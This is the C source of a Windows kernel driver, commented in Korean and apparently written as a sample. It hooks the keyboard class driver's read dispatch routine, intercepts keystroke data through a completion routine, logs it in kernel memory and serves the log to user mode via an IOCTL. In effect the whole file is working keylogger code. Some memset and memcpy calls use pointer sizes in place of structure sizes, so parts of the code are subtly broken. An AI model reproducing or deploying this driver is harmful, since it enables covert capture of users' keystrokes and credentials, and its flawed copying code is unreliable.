

#include "KeyboardHooker.h"

//전역변수들
PDRIVER_OBJECT kbdClassObject;
PDRIVER_OBJECT HookerObject;
PDRIVER_DISPATCH originDriverDispatch[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0, };
int logCount = 0;
int sequenceNumber = 0;
KSPIN_LOCK logLock; 
LIST_ENTRY logList;

//driver 주요 루틴들
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	UNICODE_STRING		sddlString;
	UNICODE_STRING		deviceName;
	UNICODE_STRING		symlinkName;
	PDEVICE_OBJECT		pCustomDeviceObject = NULL;
	UNICODE_STRING		TargetDriverUniName;
	NTSTATUS			ntStatus = STATUS_UNSUCCESSFUL;
	NTSTATUS findStatus;

	HookerObject = pDriverObject;
	
	//가로챌 대상(=키보드 드라이버) 설정
	findStatus = FindDriverObject();
	if (findStatus != STATUS_SUCCESS)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "error : %s", "Failed Hook");
		return ntStatus;
	}

	RtlInitUnicodeString(&deviceName, L"\\Device\\SampleKeyboardHooker");
	RtlInitUnicodeString(&symlinkName, L"\\DosDevices\\SampleKeyboardHookerLink");

	ntStatus = IoCreateDevice(
		pDriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&pCustomDeviceObject
	);

	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "error : %s", "Failed Make Hooker Device");
		return ntStatus;
	}

	ntStatus = IoCreateSymbolicLink(&symlinkName, &deviceName);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "error : %s", "Failed symlink");
		IoDeleteDevice(pCustomDeviceObject);
		return ntStatus;
	}

	pDriverObject->DriverUnload = KeyboardHookerUnload;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = KeyboardHookerCreate;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = KeyboardHookerClose;
	pDriverObject->MajorFunction[IRP_MJ_CLEANUP] = KeyboardHookerCleanup;

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KeyboardHookerDeviceIoControl;
	
	KeInitializeSpinLock(&logLock);
	InitializeListHead(&logList);

	pCustomDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING; 

	ntStatus = STATUS_SUCCESS;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Sucess : %s", "Sucess Entry");
	return ntStatus;
}

NTSTATUS KeyboardHookerCreate(PDEVICE_OBJECT pFDO, PIRP pIrp)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;

	//키보드 드라이버 후킹 수행
	//값을 받아오기만 할 예정이므로 IRP_MJ_READ 만 후킹 수행
	HookCallback(IRP_MJ_READ);

	pIrp->IoStatus.Status = ntStatus;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS KeyboardHookerDeviceIoControl(PDEVICE_OBJECT pFDO, PIRP pIrp)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION pStack = NULL;
	ULONG IoctlCode = 0;
	int OutputBufferLength = 0;
	int InputBufferLength = 0;
	ULONG_PTR Information = 0;

	UNREFERENCED_PARAMETER(pFDO);

	pStack = IoGetCurrentIrpStackLocation(pIrp);
	if (pStack == NULL)
	{
		ntStatus = STATUS_UNSUCCESSFUL;
		pIrp->IoStatus.Status = ntStatus;
		pIrp->IoStatus.Information = Information;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return ntStatus;
	}

	OutputBufferLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;
	InputBufferLength = pStack->Parameters.DeviceIoControl.InputBufferLength;

	IoctlCode = pStack->Parameters.DeviceIoControl.IoControlCode;

	switch (IoctlCode)
	{
	case IOCTL_KEYBOARDHHOOKER_GET_LOG:
	{
		if (OutputBufferLength < sizeof(RECORD_LIST_APP))
		{
			ntStatus = STATUS_INVALID_PARAMETER;
			break;
		}
		if (pIrp->AssociatedIrp.SystemBuffer == NULL)
		{
			ntStatus = STATUS_INVALID_PARAMETER;
			break;
		}
		Information = (ULONG_PTR)GetAndRemoveLog(pIrp->AssociatedIrp.SystemBuffer, OutputBufferLength);
		ntStatus = STATUS_SUCCESS;
		break;
	}
	case IOCTL_KEYBOARDHOOKER_CLEAR_LOG:
	{
		ClearLog();
		Information = 0;
		ntStatus = STATUS_SUCCESS;
		break;
	}
	default:
	{
		ntStatus = STATUS_UNSUCCESSFUL;
		break;
	}
	}


	pIrp->IoStatus.Status = ntStatus;
	pIrp->IoStatus.Information = Information;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS KeyboardHookerClose(PDEVICE_OBJECT pFDO, PIRP pIrp)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;

	UNREFERENCED_PARAMETER(pFDO);

	//복원
	UnhookCallback(IRP_MJ_READ);

	pIrp->IoStatus.Status = ntStatus;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS KeyboardHookerCleanup(PDEVICE_OBJECT pFDO, PIRP pIrp)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	pIrp->IoStatus.Status = ntStatus;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return ntStatus;
}

void KeyboardHookerUnload(PDRIVER_OBJECT pDriverObject)
{
	UNICODE_STRING symlinkName;

	ClearLog();

	// 심볼릭링크 해제
	RtlInitUnicodeString(&symlinkName, L"\\DosDevices\\SampleKeyboardHookerLink");
	IoDeleteSymbolicLink(&symlinkName);

	// 오브젝트 삭제
	IoDeleteDevice(pDriverObject->DeviceObject);

	return;
}

//hooking 보조 함수들
void HookCallback(unsigned char MajorFunction)
{
	if (kbdClassObject == NULL)
		return;

	if (originDriverDispatch[MajorFunction])
		return;

	originDriverDispatch[MajorFunction] = kbdClassObject->MajorFunction[MajorFunction];
	kbdClassObject->MajorFunction[MajorFunction] = NewHookerDispatch;

	return;
}

NTSTATUS NewHookerDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	NTSTATUS ntStatus = STATUS_NOT_SUPPORTED;
	PIO_STACK_LOCATION pStack = NULL;
	PDRIVER_DISPATCH pOrgDispatchFunction = NULL;
	PDRIVER_DISPATCH originDispatchFunction = NULL;
	BOOLEAN	bInserted = FALSE;

	pStack = IoGetCurrentIrpStackLocation(Irp);

	originDispatchFunction = originDriverDispatch[pStack->MajorFunction];

	if (originDispatchFunction == NULL)
	{
		ntStatus = STATUS_NOT_SUPPORTED;

		Irp->IoStatus.Status = ntStatus;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return ntStatus;
	}

	switch (pStack->MajorFunction)
	{
	case IRP_MJ_READ:
		bInserted = InsertLog(Irp, FALSE);
		break;
	}

	if (bInserted == TRUE)
	{
		// Completion Routine을 설정해서, 후처리 로그도 생성해야 한다
		doPreparePostProcessingIrp(Irp);
	}

	ntStatus = originDispatchFunction(DeviceObject, Irp);
	return ntStatus;
}

void UnhookCallback(unsigned char MajorFunction)
{
	if (kbdClassObject == NULL)
		return;

	if (originDriverDispatch[MajorFunction] == NULL) // 가로채기주소가 설정되지 않은 상태
		return;

	kbdClassObject->MajorFunction[MajorFunction] = originDriverDispatch[MajorFunction];
	originDriverDispatch[MajorFunction] = NULL;

	return;
}

void doPreparePostProcessingIrp(PIRP Irp)
{
	PIO_STACK_LOCATION pNewCompletionContext = NULL;
	PIO_STACK_LOCATION pLowerStackLocation = NULL;

	pNewCompletionContext = (PIO_STACK_LOCATION)ExAllocatePool(NonPagedPool, sizeof(IO_STACK_LOCATION));
	if (pNewCompletionContext == NULL)
		return;

	memset(pNewCompletionContext, 0, sizeof(PIO_STACK_LOCATION));

	// 현재까지 Irp->Tail.Overlay.CurrentIrpStackLocation 은 Hooker의 아래계층의 소유이다
	pLowerStackLocation = IoGetCurrentIrpStackLocation(Irp);

	// 원래 Hooker의 아래계층이 보아야하는 내용의 문맥정보를 백업한다
	memcpy(pNewCompletionContext, pLowerStackLocation, sizeof(IO_STACK_LOCATION));

	// 새로운 Completion Routine을 설정한다
	pLowerStackLocation->CompletionRoutine = HookerCompletionRoutine;
	pLowerStackLocation->Context = pNewCompletionContext;
	pLowerStackLocation->Control = (SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL);

	return;
}

NTSTATUS HookerCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID pContext)
{
	PIO_STACK_LOCATION	pNewCompletionContext = NULL;
	IO_STACK_LOCATION	TempStack;

	UCHAR OrgControl = 0;
	PIO_COMPLETION_ROUTINE OrgCompletionRoutine = NULL;
	PVOID OrgContext = NULL;

	BOOLEAN bMustCallOrgCompletionRoutine = FALSE;
	PIO_STACK_LOCATION	pLowerStackLocation = NULL;

	pNewCompletionContext = (PIO_STACK_LOCATION)pContext;
	if (pNewCompletionContext != NULL)
	{
		memcpy(&TempStack, pNewCompletionContext, sizeof(IO_STACK_LOCATION));
		OrgControl = TempStack.Control;
		OrgCompletionRoutine = TempStack.CompletionRoutine;
		OrgContext = TempStack.Context;

		// 후처리 로그를 남긴다
		// 이때, 주의할점은 현재 StackLocation 위치가 Hooker의 위 계층의 소유라는 점이다
		pLowerStackLocation = IoGetNextIrpStackLocation(Irp);
		memcpy(pLowerStackLocation, &TempStack, sizeof(IO_STACK_LOCATION));
		IoSetNextIrpStackLocation(Irp);
		InsertLog(Irp, TRUE);
		IoSkipCurrentIrpStackLocation(Irp);
	}

	if (pNewCompletionContext)
	{
		ExFreePool(pNewCompletionContext);
	}

	// Hooker 이전에 호출자의 Completion Routine 이 설정되어있으면서, 호출될 조건이 맞는지를 확인한다
	if ((OrgControl & SL_INVOKE_ON_SUCCESS) && (Irp->IoStatus.Status == STATUS_SUCCESS))
	{
		bMustCallOrgCompletionRoutine = TRUE;
	}
	else if ((OrgControl & SL_INVOKE_ON_CANCEL) && (Irp->IoStatus.Status == STATUS_CANCELLED))
	{
		bMustCallOrgCompletionRoutine = TRUE;
	}
	else if ((OrgControl & SL_INVOKE_ON_ERROR) && (!NT_SUCCESS(Irp->IoStatus.Status)))
	{
		bMustCallOrgCompletionRoutine = TRUE;
	}

	if ((bMustCallOrgCompletionRoutine == TRUE) && OrgCompletionRoutine)
	{
		return OrgCompletionRoutine(DeviceObject, Irp, OrgContext);
	}

	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	return Irp->IoStatus.Status;
}

// 로그항목을 하나 보관하는 함수
BOOLEAN InsertLog(PIRP Irp, BOOLEAN bIsStatus)
{
	PRECORD_LIST pRecordList = NULL;
	KIRQL oldIrql;
	ULONG Length = 0;
	BOOLEAN	bRet = FALSE;
	PIO_STACK_LOCATION	pStack = NULL;
	void* pTargetBuffer = NULL;

	if (logCount >= 1024)
		return bRet;

	pStack = IoGetCurrentIrpStackLocation(Irp);

	Length = sizeof(RECORD_LIST);

	pRecordList = (PRECORD_LIST)ExAllocatePool(NonPagedPool, Length);
	if (pRecordList == NULL)
		return bRet;

	memset(pRecordList, 0, Length);

	InitializeListHead(&pRecordList->List);

	pRecordList->ListData.Length = Length - sizeof(LIST_ENTRY);
	pRecordList->ListData.bIsStatus = bIsStatus;

	pRecordList->ListData.MajorFunction = pStack->MajorFunction;

	switch (pStack->MajorFunction)
	{
	case IRP_MJ_READ:
		if (bIsStatus == TRUE)
		{
			if (NT_SUCCESS(Irp->IoStatus.Status))
			{
				if ((ULONG)Irp->IoStatus.Information)
				{
					if (Irp->AssociatedIrp.SystemBuffer)
					{
						PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
						memcpy(&pRecordList->ListData.keyData, keys, sizeof(PKEYBOARD_INPUT_DATA));
					}
				}
			}
		}
		break;
	}

	pRecordList->ListData.SequenceNumber = sequenceNumber;
	sequenceNumber++;

	KeAcquireSpinLock(&logLock, &oldIrql);

	InsertTailList(&logList, &pRecordList->List);
	logCount++;

	KeReleaseSpinLock(&logLock, oldIrql);

	bRet = TRUE;
	return bRet;
}

ULONG GetAndRemoveLog(void* OutputBuffer, ULONG OutputBufferLength)
{
	PRECORD_LIST pRecordList = NULL;
	KIRQL oldIrql;
	ULONG Length = 0;

	if (OutputBuffer == NULL)
		return Length;

	if (OutputBufferLength == 0)
		return Length;

	KeAcquireSpinLock(&logLock, &oldIrql);

	if (logCount == 0)
	{
		KeReleaseSpinLock(&logLock, oldIrql);
		return Length;
	}

	pRecordList = (PRECORD_LIST)RemoveHeadList(&logList);
	logCount--;

	KeReleaseSpinLock(&logLock, oldIrql);

	Length = pRecordList->ListData.Length;
	Length = (OutputBufferLength > Length) ? Length : OutputBufferLength;

	memcpy(OutputBuffer, &pRecordList->ListData, Length);

	ExFreePool(pRecordList);

	return Length;
}

//로그 전체 삭제
void ClearLog()
{
	PRECORD_LIST pRecordList;
	KIRQL oldIrql;

	KeAcquireSpinLock(&logLock, &oldIrql);

	while (!IsListEmpty(&logList)) {

		pRecordList = (PRECORD_LIST)RemoveHeadList(&logList);
		KeReleaseSpinLock(&logLock, oldIrql);

		ExFreePool(pRecordList);

		KeAcquireSpinLock(&logLock, &oldIrql);
	}

	logCount = 0;
	sequenceNumber = 0;

	KeReleaseSpinLock(&logLock, oldIrql);
}

NTSTATUS FindDriverObject()
{
	UNICODE_STRING deviceName;
	PFILE_OBJECT fileObject;
	PDEVICE_OBJECT deviceObject;
	NTSTATUS status;

	RtlInitUnicodeString(&deviceName, L"\\Device\\KeyboardClass0");

	status = IoGetDeviceObjectPointer(
		&deviceName,
		0,
		&fileObject,
		&deviceObject
	);

	if (NT_SUCCESS(status))
	{
		kbdClassObject = deviceObject->DriverObject;
		ObDereferenceObject(fileObject);
		return STATUS_SUCCESS;
	}
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoGetDeviceObjectPointer (%wZ) failed with status 0x%08lx", deviceName, status);
	}
	return status;
}